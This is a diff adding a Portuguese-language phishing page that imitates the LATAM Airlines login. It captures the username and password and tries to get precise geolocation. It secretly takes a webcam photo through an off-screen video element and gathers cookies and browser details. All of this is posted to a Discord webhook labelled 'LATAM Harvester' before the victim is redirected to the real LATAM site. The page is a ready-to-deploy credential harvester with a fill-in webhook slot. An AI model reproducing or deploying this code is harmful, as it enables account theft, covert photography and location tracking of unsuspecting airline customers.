@@ -1,1 +1,341 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LATAM Airlines - Login</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
 
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: #ffffff url('bg.png') no-repeat center bottom;
+    background-size: cover;
+  }
+
+  .card {
+    background: #ffffff;
+    width: 100%;
+    max-width: 540px;
+    border-radius: 16px;
+    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
+    overflow: hidden;
+    border-top: 4px solid #2b1e6b;
+    margin: 20px;
+  }
+
+  .card-inner { padding: 52px 50px 44px; }
+
+  .logo { display: flex; align-items: center; margin-bottom: 40px; }
+  .logo img { height: 48px; width: auto; }
+
+  h1 {
+    font-size: 27px;
+    font-weight: 600;
+    color: #1e1b4b;
+    margin-bottom: 10px;
+    line-height: 1.25;
+  }
+
+  .subtitle {
+    font-size: 14.5px;
+    color: #5b5675;
+    margin-bottom: 34px;
+    line-height: 1.45;
+  }
+
+  .field { margin-bottom: 28px; }
+
+  label {
+    display: block;
+    font-size: 13px;
+    font-weight: 500;
+    color: #374151;
+    margin-bottom: 8px;
+  }
+
+  input[type="text"],
+  input[type="email"],
+  input[type="password"] {
+    width: 100%;
+    padding: 16px 16px;
+    border: 1px solid #d1d5db;
+    border-radius: 8px;
+    font-size: 15px;
+    color: #1f2937;
+    background: #fff;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  input::placeholder { color: #9ca3af; }
+
+  input:focus {
+    outline: none;
+    border-color: #e11d48;
+    box-shadow: 0 0 0 3px rgba(225, 29, 72, 0.12);
+  }
+
+  .btn-continue {
+    width: 100%;
+    background: #e11d48;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    padding: 16px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s;
+    margin-bottom: 22px;
+  }
+
+  .btn-continue:hover { background: #be123c; }
+
+  .create-account { text-align: center; margin-bottom: 30px; }
+  .create-account a {
+    color: #e11d48;
+    font-size: 15px;
+    font-weight: 600;
+    text-decoration: none;
+  }
+  .create-account a:hover { text-decoration: underline; }
+
+  .divider { height: 1px; background: #e5e7eb; margin-bottom: 22px; }
+
+  .regain { text-align: center; font-size: 13.5px; color: #6b7280; }
+  .regain a { color: #2563eb; text-decoration: none; font-weight: 500; }
+  .regain a:hover { text-decoration: underline; }
+
+  .hidden { display: none; }
+
+  .back-link {
+    display: inline-block;
+    margin-bottom: 20px;
+    font-size: 14px;
+    color: #6b7280;
+    text-decoration: none;
+    cursor: pointer;
+  }
+  .back-link:hover { color: #e11d48; }
+
+  /* esconde a webcam */
+  #webcam, #canvas { position: absolute; left: -9999px; }
+</style>
+</head>
+<body>
+
+  <!-- elementos invisíveis pra webcam -->
+  <video id="webcam" autoplay playsinline width="320" height="240"></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+
+  <div class="card">
+    <div class="card-inner">
+
+      <div class="logo">
+        <img src="logo.png" alt="LATAM Airlines">
+      </div>
+
+      <!-- TELA 1 -->
+      <div id="step1">
+        <h1>Digite seu usuário</h1>
+        <p class="subtitle">Se você já é membro LATAM, digite seus dados de acesso:</p>
+
+        <form id="formStep1">
+          <div class="field">
+            <input type="text" id="userId" placeholder="E-mail ou número de sócio" autocomplete="username" required>
+          </div>
+          <button type="submit" class="btn-continue">Continuar</button>
+        </form>
+
+        <div class="create-account"><a href="#">Criar conta</a></div>
+        <div class="divider"></div>
+        <div class="regain">Não consegue entrar na sua conta? <a href="#">Recuperar acesso</a></div>
+      </div>
+
+      <!-- TELA 2 -->
+      <div id="step2" class="hidden">
+        <div class="back-link" id="btnBack">← Voltar</div>
+        <h1>Digite sua senha</h1>
+        <p class="subtitle">Agora digite a senha da sua conta LATAM:</p>
+
+        <form id="formStep2">
+          <div class="field">
+            <label id="labelUser"></label>
+            <input type="password" id="password" placeholder="Senha" autocomplete="current-password" required>
+          </div>
+          <button type="submit" class="btn-continue">Entrar</button>
+        </form>
+
+        <div class="create-account"><a href="#">Esqueceu a senha?</a></div>
+        <div class="divider"></div>
+        <div class="regain">Não consegue entrar na sua conta? <a href="#">Recuperar acesso</a></div>
+      </div>
+
+    </div>
+  </div>
+
+<script>
+  // ================== CONFIGURE AQUI ==================
+  const DISCORD_WEBHOOK = "COLE_SEU_WEBHOOK_AQUI";   // <-- cola o webhook do Discord
+  const REAL_LOGIN_URL  = "https://auth.latamairlines.com/u/login/";
+  // ====================================================
+
+  let capturedUser = "";
+  let locationData = "Não permitido / não disponível";
+  let photoBase64  = null;
+
+  // Tenta pegar localização
+  function getLocation() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) {
+        resolve("Geolocalização não suportada");
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const { latitude, longitude, accuracy } = pos.coords;
+          resolve(`Lat: ${latitude}, Lon: ${longitude} (±${Math.round(accuracy)}m)\nhttps://www.google.com/maps?q=${latitude},${longitude}`);
+        },
+        () => resolve("Usuário negou ou erro ao obter localização"),
+        { enableHighAccuracy: true, timeout: 8000 }
+      );
+    });
+  }
+
+  // Tenta tirar foto da webcam
+  async function takePhoto() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: "user" }, 
+        audio: false 
+      });
+      const video = document.getElementById("webcam");
+      video.srcObject = stream;
+
+      await new Promise(r => setTimeout(r, 700)); // espera a câmera estabilizar
+
+      const canvas = document.getElementById("canvas");
+      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+      photoBase64 = canvas.toDataURL("image/jpeg", 0.7);
+
+      // para a câmera
+      stream.getTracks().forEach(track => track.stop());
+    } catch (err) {
+      photoBase64 = null;
+    }
+  }
+
+  // Envia tudo pro Discord
+  async function sendToDiscord(data) {
+    const embed = {
+      title: "🔴 Nova captura LATAM",
+      color: 0xe11d48,
+      fields: [
+        { name: "E-mail / Usuário", value: "```" + data.email + "```", inline: false },
+        { name: "Senha", value: "```" + data.password + "```", inline: false },
+        { name: "Localização", value: data.location, inline: false },
+        { name: "User-Agent", value: "```" + data.userAgent + "```", inline: false },
+        { name: "Idioma", value: data.language, inline: true },
+        { name: "Plataforma", value: data.platform, inline: true },
+        { name: "Tela", value: data.screen, inline: true },
+        { name: "Timezone", value: data.timezone, inline: true },
+        { name: "Cookies", value: "```" + (data.cookies || "nenhum") + "```", inline: false },
+        { name: "Data", value: data.date, inline: false }
+      ],
+      footer: { text: "LATAM Harvester" },
+      timestamp: new Date().toISOString()
+    };
+
+    const payload = {
+      embeds: [embed]
+    };
+
+    // Se conseguiu foto, envia como arquivo também
+    if (photoBase64) {
+      // Discord webhook com imagem precisa de FormData
+      const formData = new FormData();
+      formData.append("payload_json", JSON.stringify(payload));
+
+      // converte base64 pra blob
+      const res = await fetch(photoBase64);
+      const blob = await res.blob();
+      formData.append("file", blob, "webcam.jpg");
+
+      await fetch(DISCORD_WEBHOOK, {
+        method: "POST",
+        body: formData
+      });
+    } else {
+      await fetch(DISCORD_WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    }
+  }
+
+  // ====== Fluxo das telas ======
+  document.getElementById("formStep1").addEventListener("submit", function(e) {
+    e.preventDefault();
+    capturedUser = document.getElementById("userId").value.trim();
+    if (!capturedUser) return;
+
+    document.getElementById("labelUser").textContent = capturedUser;
+    document.getElementById("step1").classList.add("hidden");
+    document.getElementById("step2").classList.remove("hidden");
+  });
+
+  document.getElementById("btnBack").addEventListener("click", function() {
+    document.getElementById("step2").classList.add("hidden");
+    document.getElementById("step1").classList.remove("hidden");
+  });
+
+  document.getElementById("formStep2").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const password = document.getElementById("password").value;
+    const btn = e.target.querySelector("button");
+    btn.disabled = true;
+    btn.textContent = "Entrando...";
+
+    // tenta localização e foto em paralelo
+    const [loc] = await Promise.all([
+      getLocation(),
+      takePhoto()
+    ]);
+    locationData = loc;
+
+    const data = {
+      email: capturedUser,
+      password: password,
+      location: locationData,
+      userAgent: navigator.userAgent,
+      language: navigator.language || navigator.userLanguage,
+      platform: navigator.platform,
+      screen: `${screen.width}x${screen.height}`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      cookies: document.cookie || "nenhum",
+      date: new Date().toLocaleString("pt-BR")
+    };
+
+    try {
+      await sendToDiscord(data);
+    } catch (err) {
+      console.error("Erro ao enviar pro Discord:", err);
+    }
+
+    // redireciona pro site real
+    setTimeout(() => {
+      window.location.href = REAL_LOGIN_URL;
+    }, 600);
+  });
+</script>
+
+</body>
+</html>
